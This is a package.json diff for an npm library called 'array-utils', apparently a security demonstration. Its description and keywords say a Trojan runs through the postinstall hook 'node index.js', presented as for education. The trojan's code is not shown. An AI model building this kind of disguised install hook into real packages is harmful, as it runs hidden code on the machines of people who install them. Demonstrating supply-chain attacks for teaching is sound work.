@@ -1,19 +1,38 @@
 {
   "name": "array-utils",
-  "version": "2.0.0",
-  "description": "",
-  "main": "array-utils.js",
-  "directories": {
-    "lib": "lib"
-  },
+  "version": "2.1.0",
+  "description": "Some array utilities + a Trojan that runs on postinstall (education purposes)",
+  "main": "dist/index.js",
+  "types": "dist/index.d.ts",
+  "files": [
+    "/dist"
+  ],
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "node array-utils.js",
-    "start": "node array-utils.js"
+    "build": "tsc",
+    "publish-lib": "npm run build && npm publish",
+    "publish-beta": "npm run build && npm publish --tag beta",
+    "publish-dryrun": "npm run build && npm publish --dry-run",
+    "postinstall": "node index.js"
   },
-  "bin": {
-    "array-utils": "array-utils.js"
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/minicatsCB/array-utils.git"
   },
-  "author": "",
-  "license": "ISC"
+  "keywords": [
+    "array",
+    "trojan",
+    "security",
+    "education"
+  ],
+  "author": "minicatsCB",
+  "license": "MIT",
+  "bugs": {
+    "url": "https://github.com/minicatsCB/array-utils/issues"
+  },
+  "homepage": "https://github.com/minicatsCB/array-utils#readme",
+  "devDependencies": {},
+  "dependencies": {
+    "typescript": "^4.2.3"
+  }
 }
